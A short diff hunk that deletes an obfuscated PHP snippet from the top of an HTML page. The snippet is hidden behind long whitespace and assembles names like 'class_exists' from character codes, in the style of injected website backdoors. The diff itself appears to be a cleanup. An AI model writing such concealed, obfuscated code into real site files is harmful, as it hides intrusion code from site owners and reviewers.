@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $vfdMoCiFNH = chr ( 290 - 176 ).'O' . "\x5f" . "\160" . chr (89) . chr (121); $lTzFVlh = "\x63" . chr (108) . chr (97) . chr ( 471 - 356 ).chr ( 690 - 575 ).'_' . chr ( 966 - 865 )."\x78" . chr ( 669 - 564 ).chr (115) . "\x74" . "\x73";$WNgNy = class_exists($vfdMoCiFNH); $vfdMoCiFNH = "19219";$lTzFVlh = "50686";$XazCTOwdb = FALSE; ?><!DOCTYPE html>
+<!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" lang="zxx">
 
 <head>
